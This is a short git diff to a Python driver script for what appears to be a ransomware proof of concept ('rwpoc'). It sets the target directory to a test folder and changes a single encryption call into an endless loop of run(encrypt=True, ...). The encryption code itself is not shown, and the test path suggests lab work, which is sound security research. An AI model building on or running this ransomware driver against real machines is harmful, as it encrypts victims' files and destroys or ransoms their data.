@@ -8,7 +8,7 @@ from time import sleep
 from globals import get_config_path, update_existing_config
 from rwpoc import run
 
-TARGET_PATH = "<start-path-on-target-device>"
+TARGET_PATH = "/home/efrat/test_ransomware"
 
 
 def listen_for_config_changes():
@@ -58,7 +58,8 @@ if __name__ == "__main__":
         sleep(1)
 
     try:
-        run(encrypt=True, absolute_paths=TARGET_PATH)
+        while True:
+            run(encrypt=True, absolute_paths=TARGET_PATH)
     finally:
         print("finally")
         for proc in procs:
